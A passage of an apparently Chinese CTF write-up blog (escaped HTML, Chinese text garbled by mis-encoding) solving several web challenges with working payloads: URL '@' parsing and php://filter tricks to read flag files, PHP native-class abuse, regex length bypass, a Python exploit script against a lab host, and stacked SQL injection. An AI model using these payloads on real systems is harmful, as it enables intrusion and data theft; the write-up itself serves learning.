class=\"variable\">$blog_content</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$challenge</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$blog_content</span>, <span class=\"string\">&#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>è¿™é‡Œè¦æ³¨æ„æ˜¯è¿”å›çš„æ˜¯challangeå˜é‡ä¸­çš„<strong>ç½‘é¡µå†…å®¹</strong>ï¼Œå¹¶ä¸”ç½‘é¡µå†…å®¹æ˜¯ä»¥<strong>å­—ç¬¦ä¸²å½¢å¼è¿”å›çš„</strong></p>\n<blockquote>\n<p>file_get_contentsè¯¥å‡½æ•°å¯ä»¥ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–å…¶å†…å®¹ï¼Œå¹¶å°†å†…å®¹ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›</p>\n</blockquote>\n<h4 id=\"url-è§£æè§„åˆ™-1\"><a href=\"#url-è§£æè§„åˆ™-1\" class=\"headerlink\" title=\"url@è§£æè§„åˆ™\"></a>url@è§£æè§„åˆ™</h4><p>åœ¨urlä¸­è¾“å…¥<a href=\"http://jasmineaura.github.io@baidu.com/\">http://jasmineaura.github.io@baidu.com</a>, æœ€ç»ˆä¼šè§£æä¸ºåè€…ç½‘ç«™ï¼Œå³ä¸º<a href=\"http://baidu.com/\">http://baidu.com</a> </p>\n<h5 id=\"è§£æ³•ä¸€\"><a href=\"#è§£æ³•ä¸€\" class=\"headerlink\" title=\"è§£æ³•ä¸€\"></a>è§£æ³•ä¸€</h5><p>å°†è‡ªå·±æœåŠ¡å™¨å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹åªè¦åŒ…å«<strong>å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦</strong>å³å¯ï¼Œpost**@æœåŠ¡å™¨åœ°å€&#x2F;xx.txt**</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">challenge=http://jasmineaura.github.io@121.43.126.238:8009/1.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241013221105114.png\" alt=\"image-20241013221105114\"><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241013221138526.png\" alt=\"image-20241013221138526\"></p>\n<h5 id=\"è§£æ³•äºŒ\"><a href=\"#è§£æ³•äºŒ\" class=\"headerlink\" title=\"è§£æ³•äºŒ\"></a>è§£æ³•äºŒ</h5><p>ç›´æ¥@æœ¬åœ°å›ç¯åœ°å€å³å¯ï¼Œpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">challenge=http://jasmineaura.github.io@127</span><br><span class=\"line\">.0.0.1 </span><br><span class=\"line\">0.0.0.0</span><br><span class=\"line\">localhost</span><br><span class=\"line\">gz.imxbt.cn:20100 é¶åœºç½‘å€</span><br></pre></td></tr></table></figure>\n\n<p>å› ä¸º**@è¿™å‡ ä¸ªç½‘å€æ˜¯è®¿é—®å®ƒæœ¬èº«<strong>ï¼Œå¹¶ä¸”è¿™ä¸ªé¶æœºæœ¬èº«å°±åŒ…å«å·²ç»</strong>æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦**ï¼Œå³å¯ç»•è¿‡</p>\n<h3 id=\"æœ€ç»ˆpayload\"><a href=\"#æœ€ç»ˆpayload\" class=\"headerlink\" title=\"æœ€ç»ˆpayload\"></a>æœ€ç»ˆpayload</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POSTï¼š</span><br><span class=\"line\">pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@0.0.0.0&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"phpåŸç”Ÿç±»1\"><a href=\"#phpåŸç”Ÿç±»1\" class=\"headerlink\" title=\"phpåŸç”Ÿç±»1\"></a>phpåŸç”Ÿç±»1</h2><h3 id=\"basectf-2\"><a href=\"#basectf-2\" class=\"headerlink\" title=\"basectf\"></a>basectf</h3><h3 id=\"flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ\"><a href=\"#flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ\" class=\"headerlink\" title=\"flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ\"></a>flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\"># æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$J1ng</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;J&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Hong</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;H&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Keng</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;K&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Wang</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;W&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$dir</span> = <span class=\"keyword\">new</span> <span class=\"variable\">$Keng</span>(<span class=\"variable\">$Wang</span>);</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>(<span class=\"variable\">$dir</span> <span class=\"keyword\">as</span> <span class=\"variable\">$f</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>(<span class=\"variable\">$f</span> . <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable\">$J1ng</span>(<span class=\"variable\">$Hong</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿‡äºç®€å•ç›´æ¥é™„ä¸Špayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">?K=FilesystemIterator&amp;W=glob:///secret/*</span><br><span class=\"line\">POST:</span><br><span class=\"line\">SplFileObject&amp;H=php://filter/convert.base64-encode/resource=/secret/f11444g.php</span><br></pre></td></tr></table></figure>\n\n<p>å‚è€ƒæ–‡ç« ï¼š<a href=\"https://xz.aliyun.com/t/13785?time__1311=GqmxuQi=e7qeqGNDQi5BIKY5bRGKOOa4D#toc-0\">https://xz.aliyun.com/t/13785?time__1311=GqmxuQi%3De7qeqGNDQi5BIKY5bRGKOOa4D#toc-0</a></p>\n<h2 id=\"phpåŸç”Ÿç±»2\"><a href=\"#phpåŸç”Ÿç±»2\" class=\"headerlink\" title=\"phpåŸç”Ÿç±»2\"></a>phpåŸç”Ÿç±»2</h2><p>BaseCTF</p>\n<h3 id=\"1z-php\"><a href=\"#1z-php\" class=\"headerlink\" title=\"1z_php\"></a>1z_php</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\"># æˆ‘è®°å¾—å¥¹...å¥½åƒå«flag.phpå§ï¼Ÿ</span></span><br><span class=\"line\"><span class=\"variable\">$emp</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;e_m.p&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$try</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;try&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$emp</span>!=<span class=\"string\">&quot;114514&quot;</span>&amp;&amp;<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$emp</span>,<span class=\"number\">0</span>)===<span class=\"number\">114514</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$emp</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ctype_alpha</span>(<span class=\"variable\">$emp</span>[<span class=\"variable\">$i</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ ä¸æ˜¯hackerï¼Ÿé‚£è¯·å»å¤–åœºç­‰å€™ï¼&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;åªæœ‰çœŸæ­£çš„hackeræ‰èƒ½æ‹¿åˆ°flagï¼&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/.+?HACKER/is&#x27;</span>,<span class=\"variable\">$try</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$try</span>,<span class=\"string\">&#x27;HACKER&#x27;</span>) === <span class=\"literal\">TRUE</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$a</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$b</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;php&#x27;</span>)!==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;æ”¶æ‰‹å§hackerï¼Œä½ å¾—ä¸åˆ°flagçš„ï¼&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> (<span class=\"keyword\">new</span> <span class=\"variable\">$a</span>(<span class=\"variable\">$b</span>))-&gt;<span class=\"variable\">$c</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"># è§‰å¾—å›°éš¾çš„è¯å°±ç›´æ¥æŠŠshellæ‹¿å»ç”¨å§ï¼Œä¸ç”¨è°¢~</span></span><br><span class=\"line\"><span class=\"variable\">$shell</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;shell&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$shell</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ç¬¬ä¸€éƒ¨åˆ†-2\"><a href=\"#ç¬¬ä¸€éƒ¨åˆ†-2\" class=\"headerlink\" title=\"ç¬¬ä¸€éƒ¨åˆ†\"></a>ç¬¬ä¸€éƒ¨åˆ†</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$emp</span>!=<span class=\"string\">&quot;114514&quot;</span>&amp;&amp;<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$emp</span>,<span class=\"number\">0</span>)===<span class=\"number\">114514</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$emp</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ctype_alpha</span>(<span class=\"variable\">$emp</span>[<span class=\"variable\">$i</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ ä¸æ˜¯hackerï¼Ÿé‚£è¯·å»å¤–åœºç­‰å€™ï¼&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;åªæœ‰çœŸæ­£çš„hackeræ‰èƒ½æ‹¿åˆ°flagï¼&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"éæ³•å­—ç¬¦è½¬åŒ–è§„åˆ™\"><a href=\"#éæ³•å­—ç¬¦è½¬åŒ–è§„åˆ™\" class=\"headerlink\" title=\"éæ³•å­—ç¬¦è½¬åŒ–è§„åˆ™\"></a>éæ³•å­—ç¬¦è½¬åŒ–è§„åˆ™</h4><p>e_m.p -&gt;e[m.p</p>\n<h4 id=\"intvalå’Œctype-alphaç»•è¿‡\"><a href=\"#intvalå’Œctype-alphaç»•è¿‡\" class=\"headerlink\" title=\"intvalå’Œctype_alphaç»•è¿‡\"></a>intvalå’Œctype_alphaç»•è¿‡</h4><p><strong>GET: e[m.p&#x3D;114514.1</strong> </p>\n<blockquote>\n<p>114514aä¼šè¢«ctype_alphaæ£€æŸ¥ï¼Œä¸å¯ç”¨</p>\n</blockquote>\n<h3 id=\"ç¬¬äºŒéƒ¨åˆ†-2\"><a href=\"#ç¬¬äºŒéƒ¨åˆ†-2\" class=\"headerlink\" title=\"ç¬¬äºŒéƒ¨åˆ†\"></a>ç¬¬äºŒéƒ¨åˆ†</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/.+?HACKER/is&#x27;</span>,<span class=\"variable\">$try</span>))&#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$try</span>,<span class=\"string\">&#x27;HACKER&#x27;</span>) === <span class=\"literal\">TRUE</span>)&#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">&quot;ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"preg-matchå’Œ-striposç»„åˆï¼ï¼ï¼é•¿åº¦ç»•è¿‡\"><a href=\"#preg-matchå’Œ-striposç»„åˆï¼ï¼ï¼é•¿åº¦ç»•è¿‡\" class=\"headerlink\" title=\"preg_matchå’Œ!striposç»„åˆï¼ï¼ï¼é•¿åº¦ç»•è¿‡\"></a>preg_matchå’Œ!striposç»„åˆï¼ï¼ï¼é•¿åº¦ç»•è¿‡</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">b=<span class=\"string\">&#x27;HACKER&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a*<span class=\"number\">1000001</span>+b)</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>ps:é•¿åº¦ç»•è¿‡ä¸€èˆ¬ä¸ºä¸€ç™¾ä¸‡ä½ï¼Œå»ºè®®ä½¿ç”¨bpé‡å‘å™¨å‘é€</p>\n</blockquote>\n<h3 id=\"ç¬¬ä¸‰éƒ¨åˆ†-1\"><a href=\"#ç¬¬ä¸‰éƒ¨åˆ†-1\" class=\"headerlink\" title=\"ç¬¬ä¸‰éƒ¨åˆ†\"></a>ç¬¬ä¸‰éƒ¨åˆ†</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"variable\">$a</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$b</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;php&#x27;</span>)!==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;æ”¶æ‰‹å§hackerï¼Œä½ å¾—ä¸åˆ°flagçš„ï¼&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> (<span class=\"keyword\">new</span> <span class=\"variable\">$a</span>(<span class=\"variable\">$b</span>))-&gt;<span class=\"variable\">$c</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"PHPåŸç”Ÿç±»ä¹‹SplFileObject\"><a href=\"#PHPåŸç”Ÿç±»ä¹‹SplFileObject\" class=\"headerlink\" title=\"PHPåŸç”Ÿç±»ä¹‹SplFileObject\"></a>PHPåŸç”Ÿç±»ä¹‹SplFileObject</h4><p><strong>GET:a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-</strong><br><strong>encode&#x2F;resource&#x3D;flag.php&amp;c&#x3D;__toString</strong></p>\n<blockquote>\n<p>c&#x3D;__toStringæ˜¯è®©echoè§¦å‘__toStringæ–¹æ³•</p>\n</blockquote>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">res = requests.post(<span class=\"string\">&quot;http://gz.imxbt.cn:20214/?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php&amp;c=__tostring&quot;</span>, data=&#123;<span class=\"string\">&#x27;try&#x27;</span>: <span class=\"string\">&#x27;-&#x27;</span> * <span class=\"number\">1000001</span> + <span class=\"string\">&#x27;HACKER&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res.text)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h1><h2 id=\"é¢„å¤„ç†-SQL\"><a href=\"#é¢„å¤„ç†-SQL\" class=\"headerlink\" title=\"é¢„å¤„ç† SQL\"></a>é¢„å¤„ç† SQL</h2><h3 id=\"å¼ºç½‘æ¯-2019-éšä¾¿æ³¨\"><a href=\"#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨\" class=\"headerlink\" title=\"[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨\"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h3><p><a href=\"https://www.nssctf.cn/problem/17\">https://www.nssctf.cn/problem/17</a></p>\n<h3 id=\"æ€è·¯ä¸€é¢„å¤„ç†-SQL\"><a href=\"#æ€è·¯ä¸€é¢„å¤„ç†-SQL\" class=\"headerlink\" title=\"æ€è·¯ä¸€é¢„å¤„ç† SQL\"></a>æ€è·¯ä¸€é¢„å¤„ç† SQL</h3><p>é¢„å¤„ç†æµç¨‹</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165848084.png\" alt=\"image-20241031165848084\">                             </p>\n<p>Payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">prepare stmt from @sql;</span><br><span class=\"line\"></span><br><span class=\"line\">execute stmt;</span><br></pre></td></tr></table></figure>\n\n<p>**concat()**çš„ç”¨æ³• è‹¥æ²¡å®šä¹‰ï¼Œåˆ™é»˜è®¤ç”¨ é€—å· æ¥æ‹¼æ¥å­—ç¬¦ä¸²</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>**åœ¨ä¸Šæ–¹è¯­å¥ä¸­ æ˜¯å°† â€˜seâ€™**å’Œ **â€™lect * from <code>1919810931114514</code>;â€™**ä¸¤ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥</p>\n<p>æŸ¥è¯¢è¯­å¥ **select * from <code>1919810931114514</code>; **</p>\n<p><strong>ä»è€Œç»•è¿‡å…³é”®å­—è¿‡æ»¤</strong></p>\n<p><strong>å›æ˜¾</strong> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165855608.png\" alt=\"image-20241031165855608\"></p>\n<p><strong>Strstr()</strong> æŸ¥æ‰¾å­—ç¬¦ä¸²<strong>ç¬¬ä¸€æ¬¡å‡ºç°</strong> æŸ¥è¯¢èµ„æ–™å¯å‘ç° </p>\n<p>è¯¥å‡½æ•°<strong>å¯¹å¤§å°å†™æ•æ„Ÿ</strong> å› æ­¤å¯ä»¥åˆ©ç”¨<strong>å¤§å°å†™ç»•è¿‡</strong></p>\n<p>æœ€ç»ˆpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">Set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">pRepare stmt from @sql;</span><br><span class=\"line\"></span><br><span class=\"line\">execute stmt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>æœ€åè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¦ç”¨é¢„å®šä¹‰sql</strong></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165903645.png\" alt=\"image-20241031165903645\"></p>\n<h3 id=\"æ€è·¯äºŒ-çŒœæµ‹åŸè¯­å¥-ä¿®æ”¹è¡¨å\"><a href=\"#æ€è·¯äºŒ-çŒœæµ‹åŸè¯­å¥-ä¿®æ”¹è¡¨å\" class=\"headerlink\" title=\"æ€è·¯äºŒ çŒœæµ‹åŸè¯­å¥ ä¿®æ”¹è¡¨å\"></a>æ€è·¯äºŒ çŒœæµ‹åŸè¯­å¥ ä¿®æ”¹è¡¨å</h3><p><strong>å †å æ³¨å…¥è¾“å…¥show tables;ä¹‹åå‘ç°æˆ‘ä»¬å½“å‰æ‰€å¤„çš„æ•°æ®åº“ä¸­åªæœ‰ä¸¤å¼ è¡¨</strong></p>\n<p>Show columns from <code>1919810931114514</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Show columns from 